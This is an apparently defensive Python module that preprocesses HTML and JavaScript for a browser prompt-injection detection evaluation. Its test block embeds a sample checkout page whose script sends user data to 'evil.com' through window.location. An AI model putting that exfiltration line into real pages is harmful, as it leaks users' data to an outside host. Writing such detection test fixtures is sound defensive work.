"""
HTML preprocessing for BrowseSafe evaluation.

This module handles the preprocessing of HTML content to extract
relevant text while avoiding false positives from HTML/JS code.
"""

import re
from typing import Optional
from pathlib import Path

try:
    from bs4 import BeautifulSoup
    HAS_BEAUTIFULSOUP = True
except ImportError:
    HAS_BEAUTIFULSOUP = False


def preprocess_for_detection(text: str, source_type: str = "auto") -> str:
    """
    Preprocess input text based on content type.

    Args:
        text: Input text to preprocess
        source_type: Type of content ("auto", "html", "text", "javascript")

    Returns:
        Preprocessed text suitable for injection detection
    """

    # Auto-detect if HTML
    if source_type == "auto":
        source_type = "html" if is_likely_html(text) else "text"

    if source_type == "html":
        return preprocess_html(text)
    elif source_type == "javascript":
        return preprocess_javascript(text)
    else:
        # For plain text, just normalize whitespace
        return normalize_whitespace(text)


def is_likely_html(text: str) -> bool:
    """
    Detect if text is likely HTML content.

    Checks for HTML tags, attributes, and common patterns.
    """
    # Basic HTML tag patterns
    html_patterns = [
        r'<[a-zA-Z][^>]*>',  # Any opening tag
        r'</[a-zA-Z][^>]*>',  # Any closing tag
        r'<[a-zA-Z][^>]*/>',  # Self-closing tag
        r'<!DOCTYPE[^>]*>',  # DOCTYPE
        r'<!--.*?-->',  # HTML comment
    ]

    # Count matches
    html_indicators = 0
    for pattern in html_patterns:
        if re.search(pattern, text, re.IGNORECASE | re.DOTALL):
            html_indicators += 1

    # Check for common HTML attributes
    attr_patterns = [
        r'\b(src|href|onclick|onload|onerror|class|id)\s*=',  # Common attributes
        r'\b(function|var|let|const)\s+\w+\s*=',  # JS assignments
    ]

    for pattern in attr_patterns:
        if re.search(pattern, text, re.IGNORECASE):
            html_indicators += 0.5

    # Consider HTML if we have enough indicators
    return html_indicators >= 2


def preprocess_html(text: str) -> str:
    """
    Preprocess HTML content to extract meaningful text.

    Removes script/style content and extracts visible text.
    """

    # Remove script and style tags with their content
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)

    # Remove HTML comments
    text = re.sub(r'<!--.*?-->', '', text, flags=re.DOTALL | re.IGNORECASE)

    # Extract text using BeautifulSoup if available
    if HAS_BEAUTIFULSOUP:
        try:
            soup = BeautifulSoup(text, 'html.parser')

            # Remove script/style tags that might have been missed
            for script in soup(["script", "style"]):
                script.decompose()

            # Get text content
            text = soup.get_text(separator=' ', strip=True)
        except Exception:
            # Fallback to regex-based extraction
            text = extract_text_with_regex(text)
    else:
        text = extract_text_with_regex(text)

    # Normalize whitespace
    return normalize_whitespace(text)


def extract_text_with_regex(text: str) -> str:
    """
    Extract visible text from HTML using regex (fallback method).
    """
    # Remove all HTML tags
    text = re.sub(r'<[^>]+>', ' ', text)

    # Decode HTML entities
    html_entities = {
        '&amp;': '&',
        '&lt;': '<',
        '&gt;': '>',
        '&quot;': '"',
        '&#39;': "'",
        '&nbsp;': ' ',
    }

    for entity, char in html_entities.items():
        text = text.replace(entity, char)

    return text


def preprocess_javascript(text: str) -> str:
    """
    Preprocess JavaScript code to avoid false positives.

    Removes code syntax but keeps potentially malicious strings.
    """
    # Remove comments
    text = re.sub(r'//.*$', '', text, flags=re.MULTILINE)
    text = re.sub(r'/\*.*?\*/', '', text, flags=re.DOTALL)

    # Extract string literals (they might contain malicious content)
    strings = re.findall(r'["\']([^"\']+)["\']', text)

    # Join extracted strings
    result = ' '.join(strings)

    # If no strings found, return a normalized version
    if not result:
        result = normalize_whitespace(text)

    return result


def normalize_whitespace(text: str) -> str:
    """
    Normalize whitespace in text.
    """
    # Replace multiple whitespace with single space
    text = re.sub(r'\s+', ' ', text)

    # Strip leading/trailing whitespace
    text = text.strip()

    return text


def analyze_html_content(text: str) -> dict:
    """
    Analyze HTML content and provide statistics.

    Returns information about the HTML structure that might
    be useful for understanding false positives.
    """
    stats = {
        "is_html": is_likely_html(text),
        "has_scripts": bool(re.search(r'<script[^>]*>', text, re.IGNORECASE)),
        "has_onclick": bool(re.search(r'\bonclick\s*=', text, re.IGNORECASE)),
        "has_javascript": bool(re.search(r'javascript:', text, re.IGNORECASE)),
        "tag_count": len(re.findall(r'<[a-zA-Z][^>]*>', text)),
        "script_count": len(re.findall(r'<script[^>]*>', text, re.IGNORECASE)),
    }

    return stats


# Example usage and test cases
if __name__ == "__main__":
    # Test HTML preprocessing
    html_example = """
    <html>
        <head>
            <script>
                function submitOrder() {
                    // Malicious: steal data
                    window.location = "http://evil.com/steal?data=" + user_data;
                }
            </script>
            <style>
                .checkout { color: blue; }
            </style>
        </head>
        <body>
            <div class="checkout">
                <h1>Secure Checkout</h1>
                <button onclick="submitOrder()">Buy Now</button>
                <p>Please review your order before submitting.</p>
            </div>
        </body>
    </html>
    """

    print("Original HTML:")
    print(html_example[:200] + "...")
    print("\nHTML Analysis:")
    print(analyze_html_content(html_example))
    print("\nPreprocessed Text:")
    print(preprocess_for_detection(html_example))